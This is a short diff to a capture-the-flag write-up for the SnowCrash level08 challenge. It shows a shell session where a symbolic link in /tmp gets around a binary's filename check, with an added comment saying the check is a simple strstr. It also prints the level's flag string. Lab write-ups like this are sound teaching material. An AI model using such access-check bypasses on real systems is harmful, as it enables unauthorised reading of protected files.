@@ -1,5 +1,6 @@
 level08@SnowCrash:~$ ./level08 token
 You may not access 'token'
+a strings on level08 shows that "token" is present near the error message, we assume that the 'security' is a simple strcmp (or to be more precise, strstr, located a few lines above)
 level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/my_link
 level08@SnowCrash:~$ ./level08 /tmp/my_link
 quif5eloekouj29ke0vouxean
